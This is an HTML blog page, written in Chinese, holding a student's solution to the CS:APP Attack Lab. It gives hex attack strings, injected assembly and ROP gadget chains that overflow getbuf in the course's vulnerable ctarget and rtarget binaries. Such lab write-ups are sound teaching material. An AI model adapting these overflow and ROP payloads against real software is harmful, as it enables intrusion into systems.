@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html  lang="en">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 4.2.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>Attack Lab - John&#39;s Blog</title>
+
+
+    <meta name="description" content="这是大一暑假汇编课的实验。此次实验要求我们用利用缓冲区溢出的bug对目标源程序进行攻击，ctarget的缓冲区在内存中的位置不变，很容易执行植入的汇编代码，而rtarget则采用了内存随机化，几乎不可能预测缓冲区的起始地址，从而要使用ROP攻击，难度更大。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Attack Lab">
+<meta property="og:url" content="http://john-ao.github.io/2018/08/29/AttackLab/index.html">
+<meta property="og:site_name" content="John&#39;s Blog">
+<meta property="og:description" content="这是大一暑假汇编课的实验。此次实验要求我们用利用缓冲区溢出的bug对目标源程序进行攻击，ctarget的缓冲区在内存中的位置不变，很容易执行植入的汇编代码，而rtarget则采用了内存随机化，几乎不可能预测缓冲区的起始地址，从而要使用ROP攻击，难度更大。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://john-ao.github.io/images/og_image.png">
+<meta property="article:published_time" content="2018-08-29T13:53:04.000Z">
+<meta property="article:modified_time" content="2020-03-19T14:20:55.367Z">
+<meta property="article:author" content="John Ao">
+<meta property="article:tag" content="solution">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://john-ao.github.io/images/og_image.png">
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+    
+    
+    
+    
+    
+    
+    
+    <link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+    
+    
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/ao.svg" alt="Attack Lab" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">Home</a>
+                
+                <a class="navbar-item"
+                href="/archives">Archives</a>
+                
+                <a class="navbar-item"
+                href="/categories">Categories</a>
+                
+                <a class="navbar-item"
+                href="/tags">Tags</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                
+                
+                <a class="navbar-item search" title="Search" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main">
+<div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-08-29T13:53:04.000Z">2018-08-29</time>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    7 minutes read (About 1100 words)
+                </span>
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                Attack Lab
+            
+        </h1>
+        <div class="content">
+            <p>这是大一暑假汇编课的实验。此次实验要求我们用利用缓冲区溢出的bug对目标源程序进行攻击，ctarget的缓冲区在内存中的位置不变，很容易执行植入的汇编代码，而rtarget则采用了内存随机化，几乎不可能预测缓冲区的起始地址，从而要使用ROP攻击，难度更大。</p>
+<a id="more"></a>
+<hr>
+<h2 id="ctarget"><a href="#ctarget" class="headerlink" title="ctarget"></a>ctarget</h2><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>首先对ctarget文件进行反汇编<code>objdump -d ./ctarget&gt;ctarget.s</code>，在<code>ctarget.s</code>中搜索可以找到以下代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">00000000004017f5 &lt;getbuf&gt;:</span><br><span class="line">  4017f5:	48 83 ec 38          	sub    $0x38,%rsp</span><br><span class="line">  4017f9:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017fc:	e8 7e 02 00 00       	callq  401a7f &lt;Gets&gt;</span><br><span class="line">  401801:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  401806:	48 83 c4 38          	add    $0x38,%rsp</span><br><span class="line">  40180a:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000040180b &lt;touch1&gt;:</span><br><span class="line">  40180b:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  40180f:	c7 05 03 2d 20 00 01 	movl   $0x1,0x202d03(%rip)        # 60451c &lt;vlevel&gt;</span><br><span class="line">  401816:	00 00 00 </span><br><span class="line">  401819:	bf 03 31 40 00       	mov    $0x403103,%edi</span><br><span class="line">  40181e:	e8 ad f4 ff ff       	callq  400cd0 &lt;puts@plt&gt;</span><br><span class="line">  401823:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401828:	e8 97 04 00 00       	callq  401cc4 &lt;validate&gt;</span><br><span class="line">  40182d:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401832:	e8 19 f6 ff ff       	callq  400e50 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>可见getbuf先在栈里开辟了0x38的空间，再callq Gets函数进行写入，callq自动将下一条语句地址压栈以便返回时使用。于是只需要先填充56个字符，再加上touch1函数地址<code>0x40180b</code>即可，考虑到x86为小端，可得到如下攻击字符串hex：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">0b 18 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>此题要求给touch2传入参数，先看看它的反汇编代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0000000000401837 &lt;touch2&gt;:</span><br><span class="line">  401837:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  40183b:	89 fa                	mov    %edi,%edx</span><br><span class="line">  40183d:	c7 05 d5 2c 20 00 02 	movl   $0x2,0x202cd5(%rip)        # 60451c &lt;vlevel&gt;</span><br><span class="line">  401844:	00 00 00 </span><br><span class="line">  401847:	39 3d d7 2c 20 00    	cmp    %edi,0x202cd7(%rip)        # 604524 &lt;cookie&gt;</span><br><span class="line">  40184d:	75 20                	jne    40186f &lt;touch2+0x38&gt;</span><br></pre></td></tr></table></figure>
+<p>可见它是将寄存器edi与cookie进行对比，而从程序运行结果来看<code>cookie=0x47db4e3a</code>，又通过gdb调试可知读入数据的首地址是<code>0x55652778</code>，所以代码分三部分，第一部分修改edi，第二部分设置rsp以便ret到touch2，第三部分设置rsp以便ret到数据首地址，综合可得如下代码（标注了内存地址）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x55652778: movl $0x47db4e3a,%edi</span><br><span class="line">            movq $0x1411938,%rax    #处理touch2地址(不处理也无妨)</span><br><span class="line">            subq $0x1010101,%rax    #此处是为了避免代码中出现不可见字符00</span><br><span class="line">            movq %rax,0x556527a0   #准备ret</span><br><span class="line">            movq $0x556527a0,%esp</span><br><span class="line">            retq</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x556527b0: 78 27 65 55             #buf溢出覆盖原有地址</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>查表可知<code>0x47db4e3a</code>的ascii码为<code>34 37 64 62 34 65 33 61 00</code>，根据题意，我们需要将上述数据的地址赋给edi，同时又要修改esp以确保后续函数的执行不会修改上述数据段，可得代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x55652778: movl $0x55652778,%edi   #数据段地址</span><br><span class="line">            subl $0x40,%esp         #将esp下移</span><br><span class="line">            pushq $0x401948         #touch3地址</span><br><span class="line">            retq</span><br><span class="line">0x55652778: 34 37 64 62 34 65 33 61 00</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x556527b0: 78 27 65 55             #buf溢出覆盖原有地址</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="rtarget"><a href="#rtarget" class="headerlink" title="rtarget"></a>rtarget</h2><h3 id="level-2-1"><a href="#level-2-1" class="headerlink" title="level 2"></a>level 2</h3><p>题目要求将cookie传给rdi，而要操作rdi寄存器，有两种方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movq _____,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">popq %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>第一种方式hex代码为<code>48 89 ?7 c3</code>或<code>48 89 ?f c3</code>，在rtarget反汇编代码中检索可得</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019ec &lt;getval_277&gt;:</span><br><span class="line">  4019ec:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax</span><br><span class="line">  4019f1:	c3                   	retq</span><br></pre></td></tr></table></figure>
+<p>其中<code>48 89 c7 c3</code>对应的汇编指令为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movq %rax,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>于是我们还需要一个<code>popq %rax</code>实现cookie到rax寄存器的过程，对应hex为<code>58</code>，检索可得</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019f9 &lt;setval_467&gt;:</span><br><span class="line">  4019f9:	c7 07 d2 d5 4f 58    	movl   $0x584fd5d2,(%rdi)</span><br><span class="line">  4019ff:	c3                   	retq</span><br></pre></td></tr></table></figure>
+<p>综上得到攻击hex码为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fe 19 40 00 00 00 00 00 #popq %rax</span><br><span class="line">3a 4e db 47 00 00 00 00 #cookie</span><br><span class="line">ed 19 40 00 00 00 00 00 #movq %rax,%rdi</span><br><span class="line">37 18 40 00 00 00 00 00 #touch2</span><br></pre></td></tr></table></figure>
+<p>最后只需在前面随意添加56字节长的字符作为偏置。</p>
+<hr>
+<h3 id="level-3-1"><a href="#level-3-1" class="headerlink" title="level 3"></a>level 3</h3><p>此题中输入在栈中的位置是可变的，不能通过gdb确定，于是需要从rsp寄存器获取，查表知<code>movq %rsp,___</code>的hex为<code>48 89 e?</code>，在反汇编代码中查找得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401ab2 &lt;setval_317&gt;:</span><br><span class="line">  401ab2:	c7 07 48 89 e0 c3    	movl   $0xc3e08948,(%rdi)</span><br><span class="line">  401ab8:	c3                   	retq</span><br></pre></td></tr></table></figure>
+<p>其中<code>48 89 e0</code>对应的汇编代码为<code>movq %rsp,%rax</code>。</p>
+<p>但此时获取的是下一条语句的地址，如果把数据就存储在此处，ret后将会执行以数据段为地址的代码从而导致segmentation fault，所以我们需要将数据存储在前面或者后面并将rax减去或者加上偏移量。经过一番尝试，<code>addq subq inc dec</code>均不能在farm中找到，最后尝试<code>leaq ___,___</code>，对应hex码为<code>48 8d</code>，检索可得：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a21 &lt;add_xy&gt;:</span><br><span class="line">  401a21:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  401a25:	c3                   	retq</span><br></pre></td></tr></table></figure>
+<p>其中<code>48 8d 04 37</code>对应汇编代码为<code>leaq (%rdi,%rsi,1),%rax</code>。</p>
+<p>使用gdb调试发现rsi的值为<code>0x31</code>，于是可得以下攻击代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b4 1a 40 00 00 00 00 00 #movq %rsp,%rax</span><br><span class="line">ed 19 40 00 00 00 00 00 #movq %rax,%rdi</span><br><span class="line">21 1a 40 00 00 00 00 00 #leaq (%rdi,%rsi,1),%rax</span><br><span class="line">ed 19 40 00 00 00 00 00 #mov %rax,%rdi</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">34 37 64 62 34 65 33 61 00 #cookie</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/solution/" rel="tag">solution</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="menu-label has-text-centered">Like this article? Support the author with</h3>
+        <div class="buttons is-centered">
+            
+                
+<div class="notification is-danger">
+    You forgot to set the <code>qrcode</code> for Alipay. Please set it in <code>_config.yml</code>.
+</div>
+
+                
+                
+<div class="notification is-danger">
+    You forgot to set the <code>qrcode</code> for Wechat. Please set it in <code>_config.yml</code>.
+</div>
+
+                
+                <!-- Visit https://www.paypal.com/donate/buttons/ to get your donate button -->
+
+<div class="notification is-danger">
+    You forgot to set the <code>business</code> and <code>currency_code</code> for Paypal. Please set it in <code>_config.yml</code>.
+</div>
+
+                
+                
+<div class="notification is-danger">
+    You forgot to set the <code>url</code> Patreon. Please set it in <code>_config.yml</code>.
+</div>
+
+                
+        </div>
+    </div>
+</div>
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2018/11/19/Ubuntu-guide/">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">Ubuntu guide</span>
+            </a>
+        </div>
+        
+        
+    </div>
+</div>
+
+
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered" style="flex-shrink: 1">
+                <div>
+                    
+                    <figure class="image is-128x128 has-mb-6">
+                        <img class="is-rounded" src="/images/avatar_.png" alt="John Ao">
+                    </figure>
+                    
+                    <p class="is-size-4 is-block">
+                        John Ao
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        Tsinghua University
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>Beijing, China</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        Posts
+                    </p>
+                    <a href="/archives">
+                        <p class="title has-text-weight-normal">
+                            3
+                        </p>
+                    </a>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        Categories
+                    </p>
+                    <a href="/categories">
+                        <p class="title has-text-weight-normal">
+                            0
+                        </p>
+                    </a>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        Tags
+                    </p>
+                    <a href="/tags">
+                        <p class="title has-text-weight-normal">
+                            2
+                        </p>
+                    </a>
+                </div>
+            </div>
+        </nav>
+        
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://github.com/John-Ao" target="_blank" rel="noopener">
+                Follow</a>
+        </div>
+        
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="Github" href="https://github.com/John-Ao">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="Twitter" href="https://twitter.com/JohnAo480_">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="RSS" href="/">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+    
+        
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            Links
+        </h3>
+        <ul class="menu-list">
+        
+            <li>
+                <a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener">
+                    <span class="level-left">
+                        <span class="level-item">Hexo</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">hexo.io</span>
+                    </span>
+                </a>
+            </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                Categories
+            </h3>
+            <ul class="menu-list">
+            
+            </ul>
+        </div>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            Tag Cloud
+        </h3>
+        <a href="/tags/guide/" style="font-size: 20px;">guide</a> <a href="/tags/solution/" style="font-size: 10px;">solution</a>
+    </div>
+</div>
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen ">
+        
+            <div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            Recent
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2019/07/14/Arch/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Arch linux installation guide">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-07-14T14:28:45.000Z">2019-07-14</time></div>
+                    <a href="/2019/07/14/Arch/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Arch linux installation guide</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/19/Ubuntu-guide/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Ubuntu guide">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-19T05:17:18.000Z">2018-11-19</time></div>
+                    <a href="/2018/11/19/Ubuntu-guide/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Ubuntu guide</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/08/29/AttackLab/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Attack Lab">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-08-29T13:53:04.000Z">2018-08-29</time></div>
+                    <a href="/2018/08/29/AttackLab/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Attack Lab</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            Archives
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/07/">
+                <span class="level-start">
+                    <span class="level-item">July 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/11/">
+                <span class="level-start">
+                    <span class="level-item">November 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/08/">
+                <span class="level-start">
+                    <span class="level-item">August 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                Tags
+            </h3>
+            <div class="field is-grouped is-grouped-multiline">
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/guide/">
+                        <span class="tag">guide</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/solution/">
+                        <span class="tag">solution</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>
+        
+        </div>
+    
+</div>
+
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only has-order-3 column-right ">
+    
+        <div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            Recent
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2019/07/14/Arch/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Arch linux installation guide">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-07-14T14:28:45.000Z">2019-07-14</time></div>
+                    <a href="/2019/07/14/Arch/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Arch linux installation guide</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/19/Ubuntu-guide/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Ubuntu guide">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-19T05:17:18.000Z">2018-11-19</time></div>
+                    <a href="/2018/11/19/Ubuntu-guide/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Ubuntu guide</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/08/29/AttackLab/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Attack Lab">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-08-29T13:53:04.000Z">2018-08-29</time></div>
+                    <a href="/2018/08/29/AttackLab/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Attack Lab</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            Archives
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/07/">
+                <span class="level-start">
+                    <span class="level-item">July 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/11/">
+                <span class="level-start">
+                    <span class="level-item">November 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/08/">
+                <span class="level-start">
+                    <span class="level-item">August 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                Tags
+            </h3>
+            <div class="field is-grouped is-grouped-multiline">
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/guide/">
+                        <span class="tag">guide</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/solution/">
+                        <span class="tag">solution</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>
+    
+    
+</div>
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    <img src="/images/ao.svg" alt="Attack Lab" height="28">
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2020 John Ao&nbsp;
+                Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("en");</script>
+
+
+<script>
+var IcarusThemeSettings = {
+    site: {
+        url: 'http://john-ao.github.io',
+        external_link: {"enable":true,"exclude":[]}
+    },
+    article: {
+        highlight: {
+            clipboard: true,
+            fold: 'unfolded'
+        }
+    }
+};
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+
+
+
+
+
+<script src="/js/animation.js"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
